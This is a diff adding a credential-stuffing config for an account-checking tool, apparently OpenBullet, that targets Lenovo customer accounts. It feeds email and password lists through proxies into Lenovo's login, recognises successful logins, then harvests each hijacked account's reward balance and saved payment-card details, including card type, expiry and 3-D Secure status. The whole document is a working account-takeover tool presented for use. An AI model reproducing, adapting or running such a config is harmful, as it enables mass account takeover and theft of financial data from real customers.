@@ -1,0 +1,250 @@
+[SETTINGS]
+{
+  "Name": "Lenovo(@lumped)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-14T21:56:24.1774032+01:00",
+  "AdditionalInfo": "",
+  "Author": "@lumped",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "useragent" 
+
+REQUEST GET "https://passport.lenovo.com/wauthen5/preLogin?lenovoid.action=uilogin&lenovoid.realm=support.lenovo.com&lenovoid.ctx=null&lenovoid.lang=nl-NL&lenovoid.uinfo=null&lenovoid.cb=https://support.lenovo.com/nl/nl/&lenovoid.vp=null&lenovoid.display=null&lenovoid_idp=null&lenovoid.source=support.lenovo.com&lenovoid.thirdname=null&lenovoid.idreinfo=null&lenovoid.autologinname=null&lenovoid.userType=null&lenovoid.sdk=null&lenovoid.oauthstate=null&lenovoid.options=null&lenovoid.hidesocial=null" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://passport.lenovo.com/wauthen5/userLogin" 
+  CONTENT "lenovoid.action=uilogin&lenovoid.realm=support.lenovo.com&lenovoid.ctx=null&lenovoid.lang=nl-NL&lenovoid.uinfo=null&lenovoid.cb=https%3A%2F%2Fsupport.lenovo.com%2Fnl%2Fnl%2F&lenovoid.vb=null&lenovoid.display=null&lenovoid.idp=null&lenovoid.source=support.lenovo.com&lenovoid.hidesocial=null&crossRealmDomains=null&path=%2Fwauthen5&areacode=&username=<USER>&loginfinish=1&password=<PASS>&autoLoginState=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 431" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://passport.lenovo.com" 
+  HEADER "referer: https://passport.lenovo.com/wauthen5/preLogin?lenovoid.action=uilogin&lenovoid.realm=support.lenovo.com&lenovoid.ctx=null&lenovoid.lang=nl-NL&lenovoid.uinfo=null&lenovoid.cb=https://support.lenovo.com/nl/nl/&lenovoid.vp=null&lenovoid.display=null&lenovoid_idp=null&lenovoid.source=support.lenovo.com&lenovoid.thirdname=null&lenovoid.idreinfo=null&lenovoid.autologinname=null&lenovoid.userType=null&lenovoid.sdk=null&lenovoid.oauthstate=null&lenovoid.options=null&lenovoid.hidesocial=null" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: <useragent>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(LenovoID.UN)>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "block\">wachtwoord is niet correct</p>" 
+    KEY "\">Gebruikersnaam of wachtwoord is onjuist</p>" 
+
+PARSE "<SOURCE>" LR "var gateway = '" "'" -> VAR "gateway" 
+
+FUNCTION Replace "\\" "" "<gateway>" -> VAR "gateway1" 
+
+REQUEST GET "<gateway1>" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://passport.lenovo.com/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: <useragent>" 
+
+PARSE "<SOURCE>" LR "\"lenovoID\":\"" "\"" -> VAR "lenovoID" 
+
+PARSE "<SOURCE>" LR "\"Country\":\"" "\"" -> VAR "Country" 
+
+PARSE "<SOURCE>" LR "\"Language\":\"" "\"" -> VAR "Language" 
+
+PARSE "<SOURCE>" LR "name=\"_token\" content=\"" "\"" -> VAR "_token" 
+
+FUNCTION CurrentUnixTime -> VAR "UNIX" 
+
+REQUEST GET "https://passport.lenovo.com/wauthen5/synCookie.jhtml?lenovoid_realm=support.lenovo.com&_=<UNIX>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://support.lenovo.com/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: script" 
+  HEADER "sec-fetch-mode: no-cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+PARSE "<SOURCE>" LR "ZAgA" "','" -> VAR "1" "ZAgA" "" 
+
+REQUEST GET "https://support.lenovo.com/nl/nl/api/v4/account/lenovoid/verifyToken?token=<1>&realm=support.lenovo.com" 
+  
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://support.lenovo.com/nl/nl/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: <useragent>" 
+  HEADER "x-csrf-token: <_token>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+FUNCTION CurrentUnixTime -> VAR "UNIX" 
+
+REQUEST GET "https://support.lenovo.com/nl/nl/api/AuthenticatedVeiw/RefreshLogin?userconfig=%7B%22CurrentRealm%22%3A%22REALM.ALL%22%2C%22Authentication%22%3A0%2C%22Country%22%3A%22<Country>%22%2C%22Id%22%3A%22<lenovoID>%22%2C%22Language%22%3A%22<Language>%22%2C%22LoggedIn%22%3Afalse%2C%22Cart%22%3A%22public%22%2C%22Cc%22%3Afalse%2C%22Email%22%3A%22%22%7D&_=<UNIX>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://support.lenovo.com/nl/nl/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: <useragent>" 
+  HEADER "x-csrf-token: <_token>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+REQUEST GET "https://openapi.lenovo.com/us/en/leid/assign" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://account.lenovo.com/us/en/account/wallet/index.html" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: script" 
+  HEADER "sec-fetch-mode: no-cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+FUNCTION CurrentUnixTime -> VAR "UNIX" 
+
+REQUEST GET "https://passport.lenovo.com/wauthen5/synCookie.jhtml?lenovoid_realm=account.lenovo.com&_=<UNIX>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://account.lenovo.com/us/en/account/login/index.html?returnUrl=https%3A%2F%2Faccount.lenovo.com%2Fus%2Fen%2Faccount%2Fwallet%2Findex.html" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: script" 
+  HEADER "sec-fetch-mode: no-cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+PARSE "<SOURCE>" LR "ZAgAAA" "','" -> VAR "ZA" "ZAgAAA" "" 
+
+REQUEST POST "https://openapi.lenovo.com/us/en/v1/refreshToken" 
+  CONTENT "lpsust=<ZA>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-length: 168" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://account.lenovo.com" 
+  HEADER "referer: https://account.lenovo.com/us/en/account/login/index.html?returnUrl=https%3A%2F%2Faccount.lenovo.com%2Fus%2Fen%2Faccount%2Fwallet%2Findex.html" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(ttl-token)>" Exists 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotExist 
+
+REQUEST GET "https://openapi.lenovo.com/us/en/v1/home/getLoyalty" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "origin: https://account.lenovo.com" 
+  HEADER "referer: https://account.lenovo.com/us/en/account/home.html" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+PARSE "<SOURCE>" JSON "rewardsFormattedValue" CreateEmpty=FALSE -> CAP "Rewards" 
+
+REQUEST GET "https://openapi.lenovo.com/us/en/v1/payment/getAllPaymentByPage?pageSize=999&pageNumber=1" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "origin: https://account.lenovo.com" 
+  HEADER "referer: https://account.lenovo.com/us/en/account/wallet/index.html" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <useragent>" 
+
+PARSE "<SOURCE>" JSON "cardExpiryYear" -> VAR "cardExpiryYear" 
+
+PARSE "<SOURCE>" JSON "cardExpiryMonth" -> VAR "cardExpiryMonth" 
+
+PARSE "<SOURCE>" JSON "cardType" -> VAR "cardType" 
+
+PARSE "<SOURCE>" JSON "is3dsecure" -> VAR "is3dsecure" 
+
+FUNCTION Constant "<cardType> - <cardExpiryMonth>/<cardExpiryYear> | 3ds secure = <is3dsecure>" -> CAP "CC" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<CC>" Contains "- /" 
+    KEY "<Rewards>" DoesNotContain "." 
+
+FUNCTION Constant "@lumped" -> VAR "Config By" 
+
